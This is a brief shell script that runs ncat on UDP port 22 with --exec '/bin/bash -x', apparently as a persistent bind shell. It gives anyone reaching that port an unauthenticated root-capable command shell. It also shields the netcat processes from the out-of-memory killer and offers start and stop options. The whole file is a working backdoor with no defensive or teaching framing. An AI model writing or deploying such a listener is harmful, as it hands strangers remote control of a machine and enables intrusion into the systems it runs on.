#!/bin/sh -x
set -e ;
port=22 ;
command='/bin/bash -x' ;
test $1 == stop && /bin/killall ncat && exit 0 ;
test $1 == start && /bin/ncat --listen --verbose --udp --keep-open --exec "$command" $port ;
for x in $( pidof netcat ) ; do echo -17 | tee /proc/$x/oom_adj ; done ;
